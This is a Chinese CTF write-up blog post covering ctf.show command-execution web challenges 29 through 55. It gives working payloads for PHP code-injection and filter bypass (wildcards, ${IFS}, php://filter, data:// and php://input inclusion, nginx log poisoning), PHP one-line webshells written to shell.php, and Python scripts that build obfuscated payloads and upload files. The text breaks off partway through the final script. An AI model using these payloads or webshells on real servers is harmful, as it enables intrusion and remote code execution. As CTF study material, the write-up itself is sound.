href="#web-75%EF%BC%88glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81php%E5%8E%9F%E7%94%9F%E7%B1%BBDirectoryIterator%E3%80%81-toString%E3%80%81mysqli%EF%BC%89"><span class="toc-text">web-75（glob伪协议、php原生类DirectoryIterator、__toString、mysqli）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-76%EF%BC%88%E5%90%8C%E4%B8%8A%EF%BC%89"><span class="toc-text">web-76（同上）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-77%EF%BC%88FFI%E3%80%81glob%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89"><span class="toc-text">web-77（FFI、glob伪协议）</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="web-命令执行"><a href="#web-命令执行" class="headerlink" title="web-命令执行"></a>web-命令执行</h1><h2 id="web-29（-模糊匹配）"><a href="#web-29（-模糊匹配）" class="headerlink" title="web-29（*模糊匹配）"></a>web-29（*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p>
<p>发现过滤了flag关键字，这里使用*模糊匹配就行了</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="web-30（passthru、-模糊匹配）"><a href="#web-30（passthru、-模糊匹配）" class="headerlink" title="web-30（passthru、*模糊匹配）"></a>web-30（passthru、*模糊匹配）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p>
<p>又过滤了system和php关键字，我们把system换成passthru加上模糊匹配即可</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）"><a href="#web-31（tac、-09绕过空格过滤、双引号绕过单引号过滤）" class="headerlink" title="web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）"></a>web-31（tac、%09绕过空格过滤、双引号绕过单引号过滤）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p>
<p>这里又把cat、单引号和空格过滤了，可以把cat换成tac然后用url编码%09绕过空格过滤，然后使用双引号闭合</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&quot;tac%09fla*&quot;</span>);<br></code></pre></td></tr></table></figure>

<h2 id="web-32（文件包含、filter伪协议、变量覆盖）"><a href="#web-32（文件包含、filter伪协议、变量覆盖）" class="headerlink" title="web-32（文件包含、filter伪协议、变量覆盖）"></a>web-32（文件包含、filter伪协议、变量覆盖）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p>
<p>这题过滤了更多东西。这里可以通过文件包含（伪协议）和变量覆盖来写，因为include包含函数是可以包含变量的$_GET[1]不加括号是因为，include把$__GET[1]当做一个变量来看，变量的内容由1来确定，1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php是通过get请求传入的参数，内容是一个文件包含，以base64形式返回</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>

<h2 id="web-33（文件包含、data-伪协议）"><a href="#web-33（文件包含、data-伪协议）" class="headerlink" title="web-33（文件包含、data:&#x2F;&#x2F;伪协议）"></a>web-33（文件包含、data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p>
<p>和上一题差不多，但是可以用另一种方法，文件包含<strong>data:&#x2F;&#x2F;协议</strong></p>
<p>类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。从而导致任意代码执行。</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<h2 id="web-34（文件包含、input伪协议）"><a href="#web-34（文件包含、input伪协议）" class="headerlink" title="web-34（文件包含、input伪协议）"></a>web-34（文件包含、input伪协议）</h2><p>和上一题一样，但是我们换一种方法，文件包含php:&#x2F;&#x2F;input伪协议来做</p>
<p>利用该方法可以直接写入php文件，比如url中输入?file&#x3D;php:&#x2F;&#x2F;input，然后使用burp抓包，在POST请求中写入php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&amp;<span class="hljs-number">1</span>=php:<span class="hljs-comment">//input</span><br><br>抓包在post请求中写入<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;mixbp&quot;])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这样就会在服务器端自动生成我们的一句话木马文件，然后用蚁剑连接即可拿到flag</p>
<h2 id="web-35（同前几题）"><a href="#web-35（同前几题）" class="headerlink" title="web-35（同前几题）"></a>web-35（同前几题）</h2><p>和前几个题一样</p>
<h2 id="web-36（日志包含）"><a href="#web-36（日志包含）" class="headerlink" title="web-36（日志包含）"></a>web-36（日志包含）</h2><p>和前几个题相比多过滤了0-9，把GET方法中的参数改为a即可。</p>
<p><strong>使用日志包含也可以，用文件包含去包含nginx默认的access日志路径，然后访问该路径抓包，在UA头里写入一句话木马，然后用蚁剑连接即可</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br><br>日志包含<br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-regexp">/var/log</span><span class="hljs-regexp">/nginx/access</span>.log<br></code></pre></td></tr></table></figure>

<h2 id="web-37（data-伪协议、base64加密）"><a href="#web-37（data-伪协议、base64加密）" class="headerlink" title="web-37（data:&#x2F;&#x2F;伪协议、base64加密）"></a>web-37（data:&#x2F;&#x2F;伪协议、base64加密）</h2><p><img src="/../image/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p>
<p>这里eval换成了include，很明显要用文件包含，但是过滤了flag关键字，所以可以使用文件包含<strong>data:&#x2F;&#x2F;协议</strong>，将我们的代码通过base64加密后再输入，这样就能绕过flag关键字过滤了</p>
<p>语法为data:&#x2F;&#x2F;text&#x2F;plain;base64,代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br><br>PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==即为<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag,php&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h2 id="web-38（同上题）"><a href="#web-38（同上题）" class="headerlink" title="web-38（同上题）"></a>web-38（同上题）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p>
<p>比上题多过滤了个php和file关键字，使用上题的payload即可</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=data:<span class="hljs-regexp">//</span>text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/</span>Pg==<br></code></pre></td></tr></table></figure>

<h2 id="web-39（data-伪协议）"><a href="#web-39（data-伪协议）" class="headerlink" title="web-39（data:&#x2F;&#x2F;伪协议）"></a>web-39（data:&#x2F;&#x2F;伪协议）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p>
<p>源码会在我们的$c后拼接一个’.php’，但是拼接的php可以不用管,include只会处理<code>&lt;?php ?&gt;</code>内部的内容</p>
<p>但是这里试了一下好像不能用base64加密绕过了，所以使用模糊匹配绕过关键字过滤</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac fla*&quot;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>

<h2 id="web-40（无参数RCE绕过、scandir文件读取）"><a href="#web-40（无参数RCE绕过、scandir文件读取）" class="headerlink" title="web-40（无参数RCE绕过、scandir文件读取）"></a>web-40（无参数RCE绕过、scandir文件读取）</h2><p><img src="/../image/web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p>
<p>看到题目被吓到了以为过滤了小括号，结果发现是中文括号，这里可以使用无参数RCE绕过或者scandir()文件读取都行</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">无参数RCE<br>?c=<span class="hljs-keyword">eval</span>(end(<span class="hljs-keyword">pos</span>(get_defined_vars())));&amp;cmd=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br><br>或者<br><br>scandir()文件读取<br>首先，查看当前目录下文件<br>print_r(scandir(current(localeconv())));<br>发现flag.php在第二位，直接show_source读取<br>show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(current(localeconv())))));<br></code></pre></td></tr></table></figure>

<h2 id="web-41（无字母数字或运算绕过）"><a href="#web-41（无字母数字或运算绕过）" class="headerlink" title="web-41（无字母数字或运算绕过）"></a>web-41（无字母数字或运算绕过）</h2><p>这题不会直接看的题解</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">对于&#x27;/[0-9]|<span class="hljs-string">[a-z]</span>|<span class="hljs-string">\^</span>|<span class="hljs-string">\+</span>|<span class="hljs-string">\~</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\[</span>|<span class="hljs-string">\]</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\&#125;</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\-/i&#x27;</span><br></code></pre></td></tr></table></figure>

<p>该正则表达式的含义是：它会匹配任意一个数字字符、小写字母、”^”、”+”、”~”、”$”、”[“、”]”、”{“、”}”、”&amp;” 或 “-“，并且在匹配时忽略大小写。可以说过滤了大部分绕过方式，但是还剩下”|”没有过滤。所以这道题的目的就是要我们使用ascii码为0-255中没有被过滤的字符进行或运算，从而得到被绕过的字符。</p>
<p>思路如下：</p>
<ul>
<li>首先对ascii从0-255所有字符中筛选出未被过滤的字符，然后两两进行或运算，存储结果。</li>
<li>跟据题目要求，构造payload的原型，并将原型替换为或运算的结果</li>
<li>使用POST请求发送c,获取flag</li>
</ul>
<p><strong>一体化脚本：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">import</span> requests<br><br>contents = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_i = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i)<br>        hex_j = <span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(j)<br>        preg = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|~|\$|\[|]|\&#123;|&#125;|&amp;|-&#x27;</span>, re.I)<br>        <span class="hljs-keyword">if</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_i, <span class="hljs-number">16</span>))) <span class="hljs-keyword">or</span> preg.search(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(hex_j, <span class="hljs-number">16</span>))):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">else</span>:<br>            a = <span class="hljs-string">&#x27;%&#x27;</span> + hex_i<br>            b = <span class="hljs-string">&#x27;%&#x27;</span> + hex_j<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>) | <span class="hljs-built_in">int</span>(b[<span class="hljs-number">1</span>:], <span class="hljs-number">16</span>))<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= <span class="hljs-built_in">ord</span>(c) &lt;= <span class="hljs-number">126</span>:<br>                contents.append([c, a, b])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_payload</span>(<span class="hljs-params">cmd</span>):<br>    payload1 = <span class="hljs-string">&#x27;&#x27;</span><br>    payload2 = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> contents:<br>            <span class="hljs-keyword">if</span> i == j[<span class="hljs-number">0</span>]:<br>                payload1 += j[<span class="hljs-number">1</span>]<br>                payload2 += j[<span class="hljs-number">2</span>]<br>                <span class="hljs-keyword">break</span><br>    payload = <span class="hljs-string">&#x27;(&quot;&#x27;</span> + payload1 + <span class="hljs-string">&#x27;&quot;|&quot;&#x27;</span> + payload2 + <span class="hljs-string">&#x27;&quot;)&#x27;</span><br>    <span class="hljs-keyword">return</span> payload<br><br><br>URL = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;url:&#x27;</span>)<br>payload = make_payload(<span class="hljs-string">&#x27;system&#x27;</span>) + make_payload(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)<br>response = requests.post(URL, data=&#123;<span class="hljs-string">&#x27;c&#x27;</span>: urllib.parse.unquote(payload)&#125;)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-42（-绕过-dev-null-2-1命令）"><a href="#web-42（-绕过-dev-null-2-1命令）" class="headerlink" title="web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）"></a>web-42（||绕过 &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1命令）</h2><p>这题给我们的$c后拼接了一个<code>&quot; &gt;/dev/null 2&gt;&amp;1&quot;</code>，该命令让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
<p>这里可以使用<code>||</code>来绕过，这里用%0a和%26都行</p>
<p><strong>||类似于程序中的if-else语句。若前面的命令执行成功，则后面的命令就不会执行。若前面的命令执行失败，则执行后面的命令</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=cat flag.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-43（tac）"><a href="#web-43（tac）" class="headerlink" title="web-43（tac）"></a>web-43（tac）</h2><p>比上一题多过滤了个cat和分号，换tac即可</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac flag.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-44（-模糊匹配）"><a href="#web-44（-模糊匹配）" class="headerlink" title="web-44（*模糊匹配）"></a>web-44（*模糊匹配）</h2><p>又比上题多过滤了个flag，这里用*号模糊匹配即可</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac fla*||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-45（-09绕过空格过滤、-IFS-）"><a href="#web-45（-09绕过空格过滤、-IFS-）" class="headerlink" title="web-45（%09绕过空格过滤、${IFS}）"></a>web-45（%09绕过空格过滤、${IFS}）</h2><p>比上一题多过滤了个空格，用url编码<code>%09</code>代替空格即可，用<code>$&#123;IFS&#125;</code>也行</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla*||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-46（-转义、-转义绕过-号过滤）"><a href="#web-46（-转义、-转义绕过-号过滤）" class="headerlink" title="web-46（?转义、\转义绕过*号过滤）"></a>web-46（?转义、\转义绕过*号过滤）</h2><p>又多过滤了<em>号，*<em>可以用?或者\转义绕过</em></em></p>
<p><strong>用’’和””空字符绕过也行</strong></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br><br>或者<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac&lt;fla\g.php||<br><br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl&#x27;&#x27;ag.php||<br>?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fl<span class="hljs-string">&quot;&quot;</span>ag.php||<br><br>注意：用了?就不能用重定向符&lt;来绕过空格了<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-47（同上题）"><a href="#web-47（同上题）" class="headerlink" title="web-47（同上题）"></a>web-47（同上题）</h2><p>又多过滤了一些命令more、less、head、sort、tail，用上一关的payload就行了</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>tac<span class="hljs-variable">%09</span>fla?.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-48（同上题）"><a href="#web-48（同上题）" class="headerlink" title="web-48（同上题）"></a>web-48（同上题）</h2><p>还是没过滤tac，一样</p>
<hr>
<h2 id="web-49（同上题）"><a href="#web-49（同上题）" class="headerlink" title="web-49（同上题）"></a>web-49（同上题）</h2><p>还是一样</p>
<hr>
<h2 id="web-50（"><a href="#web-50（" class="headerlink" title="web-50（&lt;重定向符绕过空格过滤）"></a>web-50（&lt;重定向符绕过空格过滤）</h2><p>依然可以用tac绕过，但是%和制表符被过滤了</p>
<p>注意：这里过滤了&#x2F;x09即制表符</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=tac&lt;fl\ag.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-51（nl、"><a href="#web-51（nl、" class="headerlink" title="web-51（nl、&lt;重定向符）"></a>web-51（nl、&lt;重定向符）</h2><p>这题过滤了tac和%，用nl和&lt;绕过就行了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">c</span>=nl&lt;fl\ag.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-52（-IFS-绕过空格过滤）"><a href="#web-52（-IFS-绕过空格过滤）" class="headerlink" title="web-52（${IFS}绕过空格过滤）"></a>web-52（${IFS}绕过空格过滤）</h2><p>这题把&lt;给过滤了，但是没过滤字母和$符号以及大括号，所以能用${IFS}代替空格</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=<span class="hljs-built_in">nl</span><span class="hljs-variable">$&#123;IFS&#125;</span>fl\ag.php||<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-53（同上）"><a href="#web-53（同上）" class="headerlink" title="web-53（同上）"></a>web-53（同上）</h2><p>一样用$IFS即可</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=nl<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br>或者<br><span class="hljs-string">?c</span>=ta<span class="hljs-string">&#x27;&#x27;</span>c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl\ag.php<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-54（通过命令路径使用cat命令、rev）"><a href="#web-54（通过命令路径使用cat命令、rev）" class="headerlink" title="web-54（通过命令路径使用cat命令、rev）"></a>web-54（通过命令路径使用cat命令、rev）</h2><p>这里用了</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">.*c</span>.*a.*t.*|<span class="hljs-type">这种匹配方式</span><br><span class="hljs-type">匹配包含字符 c</span>、a、t 的任意顺序的字符串，例如 cat、cbaat 等<br></code></pre></td></tr></table></figure>

<p>所以可以这样绕过，通过命令路径来使用cat命令（linux路径下万物皆文件）</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/ca</span>?<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;f?<span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br>或者<br><span class="hljs-string">?c</span>=rev<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla?.php<br>输出出来是反转的<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）"><a href="#web-55（无字母base64-通配符、-usr-bin-bzip2压缩命令、bash-shell转义字符）" class="headerlink" title="web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）"></a>web-55（无字母base64+通配符、&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令、bash shell转义字符）</h2><p>由于过滤了字母，但没有过滤数字，我们尝试使用&#x2F;bin目录下的可执行程序。</p>
<p>但因为字母不能传入，我们需要使用通配符?来进行代替</p>
<p><strong>base64+通配符</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/base</span>64 flag.php<br>替换为<br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>

<p><strong>&#x2F;usr&#x2F;bin&#x2F;bzip2压缩命令，将flag.php压缩为压缩包，访问并下载</strong></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">2</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br>即/usr/bin/bzip2 flag.php<br>把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。<br></code></pre></td></tr></table></figure>

<p><strong>bash shell的转义字符</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Bash shell中，\是转义字符的开始。当你使用\后跟一个数字时，Bash会将其解释为八进制数，并将其转换为对应的ASCII字符。<br><br>可通过 <span class="hljs-variable">$</span><span class="hljs-string">&#x27;[转义字符]&#x27;</span>构造命令。<br><br>payload:<br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\154\163&#x27;</span>    <span class="hljs-built_in">ls</span><br>?c=<span class="hljs-variable">$</span><span class="hljs-string">&#x27;\143\141\164&#x27;</span>%<span class="hljs-number">20</span>*    <span class="hljs-built_in">cat</span> *<br></code></pre></td></tr></table></figure>

<p>这里也可以用文件上传加读取</p>
<p>先构造一个文件上传的POST数据包；</p>
<p>二：PHP页面生成临时文件phpXXXXXX，存储在&#x2F;tmp目录下；</p>
<p>三：执行指令.&#x2F;???&#x2F;??????[@-[]，读取文件执行其中指令；</p>
<p>用python脚本直接完成，也可以写个表单去上传都行</p>
<p>先使用python脚本上传文件并访问，这样就能生成一个shell.php文件</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">import</span> requests<br><br>url2 = <span class="hljs-string">&#x27;http://03b01a20-43d6-439e-b60d-6bb746c9332f.challenge.ctf.show/?c=.+/???/????????[@-[]&#x27;</span><br><span class="hljs-keyword">file</span> = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;mixbp.txt&quot;</span>,<span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[1]);&#x27; &gt; shell.php&quot;</span>)&#125;<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:<br>    r = 